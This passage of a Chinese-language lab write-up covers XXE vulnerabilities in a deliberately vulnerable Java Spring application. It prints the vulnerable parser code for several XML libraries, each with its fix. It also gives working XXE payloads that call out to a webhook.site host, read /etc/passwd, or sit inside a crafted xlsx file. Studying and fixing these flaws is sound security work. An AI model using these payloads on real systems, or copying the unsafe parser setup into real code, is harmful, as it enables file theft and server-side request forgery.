<span class="comment">// parse xml</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xmlReader xxe vuln code&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        <span class="keyword">return</span> EXCEPT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-xxe-SAXBuilder-vuln"><a href="#2-xxe-SAXBuilder-vuln" class="headerlink" title="2.&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln"></a>2.&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXBuilderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXBuilder builder = new SAXBuilder();</span><br><span class="line">            // org.jdom2.Document document</span><br><span class="line">            builder.build(new InputSource(new StringReader(body)));  // cause xxe</span><br><span class="line">            return &quot;SAXBuilder xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>换用SAXReader第三方库，攻击手法同上（注意请求要以http格式进行解析）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251712331.png" alt="image-20250725171230237" loading="lazy"></p><h4 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码"></a>修复代码</h4><p>通过<code>setFeature</code>关闭DTD和外部实体解析从而防止了xxe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="line">public String xmlReaderSec(HttpServletRequest request) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        String body = WebUtils.getRequestBody(request);</span><br><span class="line">        logger.info(body);</span><br><span class="line"></span><br><span class="line">        XMLReader xmlReader = XMLReaderFactory.createXMLReader();</span><br><span class="line">        // fix code start</span><br><span class="line">        xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">        xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">        xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">        //fix code end</span><br><span class="line">        xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return EXCEPT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;xmlReader xxe security code&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-xxe-SAXReader-vuln"><a href="#3-xxe-SAXReader-vuln" class="headerlink" title="3.&#x2F;xxe&#x2F;SAXReader&#x2F;vuln"></a>3.&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXReaderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXReader reader = new SAXReader();</span><br><span class="line">            // org.dom4j.Document document</span><br><span class="line">            reader.read(new InputSource(new StringReader(body))); // cause xxe</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;SAXReader xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>和前两个的payload一样但区别是这个有回显</p><h4 id="4-xxe-SAXParser-vuln"><a href="#4-xxe-SAXParser-vuln" class="headerlink" title="4.&#x2F;xxe&#x2F;SAXParser&#x2F;vuln"></a>4.&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">  public String SAXParserVuln(HttpServletRequest request) &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">          String body = WebUtils.getRequestBody(request);</span><br><span class="line">          logger.info(body);</span><br><span class="line"></span><br><span class="line">          SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">          SAXParser parser = spf.newSAXParser();</span><br><span class="line">          parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml</span><br><span class="line"></span><br><span class="line">          return &quot;SAXParser xxe vuln code&quot;;</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">          logger.error(e.toString());</span><br><span class="line">          return EXCEPT;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-xxe-Digester-vuln"><a href="#5-xxe-Digester-vuln" class="headerlink" title="5.&#x2F;xxe&#x2F;Digester&#x2F;vuln"></a>5.&#x2F;xxe&#x2F;Digester&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DigesterVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            Digester digester = new Digester();</span><br><span class="line">            digester.parse(new StringReader(body));  // parse xml</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Digester xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="6-xxe-DocumentBuilder-vuln"><a href="#6-xxe-DocumentBuilder-vuln" class="headerlink" title="6.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln"></a>6.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DocumentBuilderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            InputSource is = new InputSource(request.getInputStream());</span><br><span class="line">            Document document = db.parse(is);  // parse xml</span><br><span class="line"></span><br><span class="line">            // 遍历xml节点name和value</span><br><span class="line">            StringBuilder buf = new StringBuilder();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                for (int j = 0; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return buf.toString();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是JDK自带的类，以此产生的XXE是存在回显的</p><h4 id="7-xxe-DocumentBuilder-xinclude-vuln"><a href="#7-xxe-DocumentBuilder-xinclude-vuln" class="headerlink" title="7.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln"></a>7.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setXIncludeAware(true);   // 支持XInclude</span><br><span class="line">            dbf.setNamespaceAware(true);  // 支持XInclude</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = new StringReader(body);</span><br><span class="line">            InputSource is = new InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  // parse xml</span><br><span class="line"></span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            response(rootNodeList);</span><br><span class="line"></span><br><span class="line">            sr.close();</span><br><span class="line">            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="8-xxe-XMLReader-vuln"><a href="#8-xxe-XMLReader-vuln" class="headerlink" title="8.&#x2F;xxe&#x2F;XMLReader&#x2F;vuln"></a>8.&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/XMLReader/vuln&quot;)</span><br><span class="line">    public String XMLReaderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">            XMLReader xmlReader = saxParser.getXMLReader();</span><br><span class="line">            xmlReader.parse(new InputSource(new StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;XMLReader xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="9-xxe-DocumentHelper-vuln"><a href="#9-xxe-DocumentHelper-vuln" class="headerlink" title="9.&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln"></a>9.&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/DocumentHelper/vuln&quot;)</span><br><span class="line">    public String DocumentHelper(HttpServletRequest req) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(req);</span><br><span class="line">            DocumentHelper.parseText(body); // parse xml</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;DocumentHelper xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private static void response(NodeList rootNodeList)&#123;</span><br><span class="line">        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode = rootNodeList.item(i);</span><br><span class="line">            NodeList xxe = rootNode.getChildNodes();</span><br><span class="line">            for (int j = 0; j &lt; xxe.getLength(); j++) &#123;</span><br><span class="line">                Node xxeNode = xxe.item(j);</span><br><span class="line">                // 测试不能blind xxe，所以强行加了一个回显</span><br><span class="line">                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY；不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。</p><h4 id="上述存在XXE漏洞库对比"><a href="#上述存在XXE漏洞库对比" class="headerlink" title="上述存在XXE漏洞库对比"></a>上述存在XXE漏洞库对比</h4><table><thead><tr><th align="left"><strong>工具&#x2F;类</strong></th><th align="left"><strong>简介</strong></th><th align="left"><strong>使用场景</strong></th><th align="left"><strong>优点</strong></th><th align="left"><strong>缺点</strong></th></tr></thead><tbody><tr><td align="left"><code>xmlReader</code></td><td align="left">SAX 的接口，基于事件驱动的解析</td><td align="left">处理大型 XML 文件</td><td align="left">内存占用小，速度快</td><td align="left">需要手动管理上下文，处理复杂结构困</td></tr><tr><td align="left"><code>SAXBuilder</code></td><td align="left">JDOM 中基于 SAX 的解析器</td><td align="left">需要用 JDOM 处理 XML 数据时</td><td align="left">结合了 SAX 的高效性和 JDOM 的易用性</td><td align="left">解析速度依赖于 SAX，灵活性低于 DOM</td></tr><tr><td align="left">SAXReader&#96;</td><td align="left">Dom4j 中基于 SAX 的解析器</td><td align="left">需要 Dom4j 进行 XML 操作时</td><td align="left">高效且灵活，支持树结构</td><td align="left">性能略逊于纯 SAX</td></tr><tr><td align="left"><code>SAXParser</code></td><td align="left">Java 中的 SAX 解析器</td><td align="left">基于事件驱动的解析，适合处理大型 XML 文件</td><td align="left">高效，内存占用小</td><td align="left">解析复杂 XML 需要手动处理回调</td></tr><tr><td align="left">Digester&#96;</td><td align="left">基于 SAX，将 XML 映射到 Java 对象（Apache Commons 提供）</td><td align="left">需要将 XML 映射为 Java 对象时</td><td align="left">简化 XML 与 Java 对象的映射</td><td align="left">对大文件不友好，灵活性较低</td></tr><tr><td align="left">DocumentBuilder&#96;</td><td align="left">Java 中 DOM 解析器，用于构建树状结构</td><td align="left">需要完整树结构操作，如修改和多次遍历 XML 文件</td><td align="left">完整保留文档结构，易于查找和修改</td><td align="left">内存占用较大，处理大文件时性能较差</td></tr><tr><td align="left"><code>DocumentHelper</code></td><td align="left">Dom4j 提供的辅助类，用于快速创建和操作 XML 文档</td><td align="left">需要手动构建和操作 XML 文档时</td><td align="left">快速创建和处理 XML 文档，灵活性高</td><td align="left">内存占用较大，处理超大文件时性能不佳</td></tr></tbody></table><h4 id="统一漏洞利用payload"><a href="#统一漏洞利用payload" class="headerlink" title="统一漏洞利用payload"></a>统一漏洞利用payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281127895.png" alt="image-20250728112724781" loading="lazy"></p><h4 id="统一修复代码"><a href="#统一修复代码" class="headerlink" title="统一修复代码"></a>统一修复代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//实例化解析类之后通常会支持着三个配置</span><br><span class="line">obj.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">obj.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">obj.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>禁用了外部实体，限制实体来源。</p><h4 id="10-xxe-xmlbeam-vuln"><a href="#10-xxe-xmlbeam-vuln" class="headerlink" title="10.&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln"></a>10.&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(value = &quot;/xmlbeam/vuln&quot;)</span><br><span class="line">HttpEntity&lt;String&gt; post(@RequestBody UserPayload user) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        logger.info(user.toString());</span><br><span class="line">        return ResponseEntity.ok(String.format(&quot;hello, %s!&quot;, user.getUserName()));</span><br><span class="line">    &#125;catch (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        return ResponseEntity.ok(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.</span><br><span class="line"> */</span><br><span class="line">@ProjectedPayload</span><br><span class="line">public interface UserPayload &#123;</span><br><span class="line">    @XBRead(&quot;//userName&quot;)</span><br><span class="line">    String getUserName();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该代码需要使用固定的标签可以实现回显，我们可以构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;userPayload&gt;</span><br><span class="line">    &lt;userName&gt;&amp;xxe;&lt;/userName&gt;</span><br><span class="line">&lt;/userPayload&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281443153.png" alt="image-20250728144316073" loading="lazy"></p><h4 id="11-ooxml-readxlsx"><a href="#11-ooxml-readxlsx" class="headerlink" title="11&#x2F;ooxml&#x2F;readxlsx"></a>11&#x2F;ooxml&#x2F;readxlsx</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/readxlsx&quot;)</span><br><span class="line">   @ResponseBody</span><br><span class="line">   public String ooxml_xxe(MultipartFile file) throws IOException &#123;</span><br><span class="line">       XSSFWorkbook wb = new XSSFWorkbook(file.getInputStream()); // xxe vuln</span><br><span class="line"></span><br><span class="line">       XSSFSheet sheet = wb.getSheetAt(0);</span><br><span class="line">       XSSFRow row;</span><br><span class="line">       XSSFCell cell;</span><br><span class="line"></span><br><span class="line">       Iterator rows = sheet.rowIterator();</span><br><span class="line">       StringBuilder sbResult = new StringBuilder();</span><br><span class="line"></span><br><span class="line">       while (rows.hasNext()) &#123;</span><br><span class="line"></span><br><span class="line">           row = (XSSFRow) rows.next();</span><br><span class="line">           Iterator cells = row.cellIterator();</span><br><span class="line"></span><br><span class="line">           while (cells.hasNext()) &#123;</span><br><span class="line">               cell = (XSSFCell) cells.next();</span><br><span class="line"></span><br><span class="line">               if (cell.getCellType() == XSSFCell.CELL_TYPE_STRING) &#123;</span><br><span class="line">                   sbResult.append(cell.getStringCellValue()).append(&quot; &quot;);</span><br><span class="line">               &#125; else if (cell.getCellType() == XSSFCell.CELL_TYPE_NUMERIC) &#123;</span><br><span class="line">                   sbResult.append(cell.getNumericCellValue()).append(&quot; &quot;);</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   logger.info(&quot;errors&quot;);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return sbResult.toString();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看源码得知使用的是poi-ooxml组件（ Apache POI是提供Microsoft Office系列文档读、写功能的 JAVA 类库）进行xlsx文件操作，在3.10版本及以下存在XXE注入漏洞，3.15以下版本存在Dos漏洞，这里使用的是3.9版本。</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281145386.png" alt="image-20250728114555336" loading="lazy"></p><p>我们新建一个1.xlsx，用7-zip打开这个文件的压缩包</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281417899.png" alt="image-20250728141719633" loading="lazy"></p><p>然后修改[Content_Types].xml文件，在最上面添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ELEMENT foo ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;xxe;&lt;/test&gt;</span><br></pre></td></tr></table></figure><p>在upload路由下上传这个1.xlsx，我们在webhook能发现这个文件执行成功了</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281418084.png" alt="image-20250728141829969" loading="lazy"></p><h4 id="12-xlsx-streamer-readxlsx"><a href="#12-xlsx-streamer-readxlsx" class="headerlink" title="12.&#x2F;xlsx-streamer&#x2F;readxlsx"></a>12.&#x2F;xlsx-streamer&#x2F;readxlsx</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/readxlsx&quot;)</span><br><span class="line">   public void xllx_streamer_xxe(MultipartFile file) throws IOException &#123;</span><br><span class="line">       StreamingReader.builder().open(file.getInputStream());</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>和上题相比就是换了个库的区别，payload一样的</p><h3 id="Commandinject"><a href="#Commandinject" class="headerlink" title="Commandinject"></a>Commandinject</h3><h4 id="1-codeinject"><a href="#1-codeinject" class="headerlink" title="1.&#x2F;codeinject"></a>1.&#x2F;codeinject</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/codeinject&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">codeInject</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    String[] cmdList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, 